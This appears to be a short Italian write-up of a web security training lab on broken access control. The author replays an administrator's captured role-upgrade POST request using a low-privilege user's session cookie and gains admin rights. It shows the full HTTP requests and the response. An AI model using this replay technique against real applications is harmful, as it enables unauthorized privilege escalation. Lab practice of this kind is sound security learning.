
Mi loggo come utente `wiener`, questo è il mio cookie: `pdYAtOzRh8ilGEkh0wNEq1MOuTnISiKI`

La richiesta per upgradare l'utente `carlos` a "admin" è questa POST (mi ero loggato come `admin`)

```http
POST /admin-roles HTTP/2
Host: 0a4d000b031383de80003085006a006b.web-security-academy.net
Cookie: session=B7MqGBElHN5n6aurvRyCqXtFwVoq6lfH
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Origin: https://0a4d000b031383de80003085006a006b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4d000b031383de80003085006a006b.web-security-academy.net/admin-roles
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

action=upgrade&confirmed=true&username=carlos
```


Provo dunque a fare la stessa POST con il cookie di `wiener`




```http
POST /admin-roles HTTP/2
Host: 0a4d000b031383de80003085006a006b.web-security-academy.net
Cookie: session=Q4gf3rY1HlrJf7U6dD2DnJpbFkyxllxh
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Origin: https://0a4d000b031383de80003085006a006b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4d000b031383de80003085006a006b.web-security-academy.net/admin-roles
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

action=upgrade&confirmed=true&username=wiener
```

response

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

lab solved
